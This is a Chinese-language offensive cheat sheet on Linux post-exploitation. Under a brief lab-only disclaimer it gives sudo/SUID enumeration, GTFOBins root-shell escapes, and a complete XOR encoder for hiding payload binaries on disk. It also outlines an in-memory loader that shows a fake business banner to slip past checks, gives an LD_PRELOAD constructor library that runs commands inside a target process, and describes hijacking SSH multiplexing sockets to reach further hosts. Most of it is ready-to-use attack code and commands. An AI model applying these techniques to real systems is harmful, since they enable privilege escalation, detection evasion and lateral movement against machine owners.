# Linux

::: warning 仅供学习 / 授权实验
编码 loader 和共享库只在你的 lab 里对授权目标用。
:::

## sudo / SUID

```bash
sudo -l
find / -perm -4000 2>/dev/null
getcap -r / 2>/dev/null
```

对照 [GTFOBins](https://gtfobins.github.io/)：

```bash
sudo vim -c ':!/bin/sh'
sudo find /etc/passwd -exec /bin/sh \;
sudo less /etc/profile
# 然后 !sh
```

## XOR 编码（磁盘不留明文 ELF）

```python
#!/usr/bin/env python3
import argparse, sys
def parse_key(t):
    return [int(p, 0) if p.lower().startswith("0x") else int(p) for p in t.split(",")]
def xor_bytes(data, keys):
    return bytes(b ^ keys[i % len(keys)] for i, b in enumerate(data))
ap = argparse.ArgumentParser()
ap.add_argument("-i", required=True); ap.add_argument("-o")
ap.add_argument("-k", default="0xfa"); ap.add_argument("--c-array", action="store_true")
ap.add_argument("-d", action="store_true")
a = ap.parse_args()
keys = parse_key(a.k)
data = open(a.i, "rb").read()
out = xor_bytes(data, keys)
if a.c_array:
    print("unsigned char enc[] = {" + ", ".join(f"0x{b:02X}" for b in out) + "};")
else:
    open(a.o or "out.enc", "wb").write(out)
```

Loader 思路：mmap 密文 → XOR → mprotect PROT_EXEC → 跳进去。主进程同时打印业务横幅 / sleep，好过包装器检查。

## LD_PRELOAD / LD_LIBRARY_PATH

```c
/* gcc -shared -fPIC -o /tmp/x.so x.c */
#include <stdlib.h>
#include <unistd.h>
void __attribute__((constructor)) init(void) {
    unsetenv("LD_PRELOAD");
    system("id > /tmp/pwned");
}
```

```bash
LD_PRELOAD=/tmp/x.so /usr/bin/target
LD_LIBRARY_PATH=/tmp /usr/bin/target   # 库文件名必须对上 ldd 里的裸名
ldd /usr/bin/target
LD_DEBUG=libs /usr/bin/target 2>&1 | head
```

setuid 程序常忽略 `LD_PRELOAD`。

## SSH 复用

```bash
ls -l ~/.ssh/ /tmp/ssh-* 2>/dev/null
ssh -S /path/to/mux -O check dummy
ssh -S /path/to/mux user@next-hop
ssh-add -l
```

## 制品替换

覆盖前对齐架构、文件名、业务输出，保留回滚副本。
